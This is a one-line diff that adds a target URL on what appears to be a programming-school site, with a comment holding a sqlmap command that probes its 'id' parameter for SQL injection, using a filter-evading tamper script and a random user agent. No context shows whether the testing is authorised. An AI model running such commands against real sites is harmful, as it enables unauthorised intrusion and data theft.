@@ -1,0 +1,1 @@
+https://grup5.escueladeprogramacion.net/?id=1 (GET)  # sqlmap.py -u https://grup5.escueladeprogramacion.net/?id=1 --tamper=space2comment --random-agent
